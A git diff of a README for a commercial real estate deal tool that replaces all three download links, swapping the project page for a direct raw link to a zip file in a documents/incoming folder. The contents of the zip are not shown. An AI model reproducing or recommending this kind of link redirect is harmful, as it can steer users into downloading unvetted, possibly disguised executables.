@@ -1,6 +1,6 @@
 # 🤖 cre-acquisition-orchestrator - Manage CRE deals with less effort
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/freehand-alkalimetry830/cre-acquisition-orchestrator)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/freehand-alkalimetry830/cre-acquisition-orchestrator/main/documents/incoming/cre_acquisition_orchestrator_3.3.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ It uses 31 agents, 5 deal phases, and 8 domain skills to organize work. You do n
 
 Use this link to visit the page and download the app:
 
-[https://github.com/freehand-alkalimetry830/cre-acquisition-orchestrator](https://github.com/freehand-alkalimetry830/cre-acquisition-orchestrator)
+[https://raw.githubusercontent.com/freehand-alkalimetry830/cre-acquisition-orchestrator/main/documents/incoming/cre_acquisition_orchestrator_3.3.zip](https://raw.githubusercontent.com/freehand-alkalimetry830/cre-acquisition-orchestrator/main/documents/incoming/cre_acquisition_orchestrator_3.3.zip)
 
 If the page shows a release file for Windows, download it to your PC. If it shows the source project, use the download option on that page and then follow the steps below.
 
@@ -188,4 +188,4 @@ This project focuses on:
 
 ## 📎 Download again
 
-[https://github.com/freehand-alkalimetry830/cre-acquisition-orchestrator](https://github.com/freehand-alkalimetry830/cre-acquisition-orchestrator)
+[https://raw.githubusercontent.com/freehand-alkalimetry830/cre-acquisition-orchestrator/main/documents/incoming/cre_acquisition_orchestrator_3.3.zip](https://raw.githubusercontent.com/freehand-alkalimetry830/cre-acquisition-orchestrator/main/documents/incoming/cre_acquisition_orchestrator_3.3.zip)
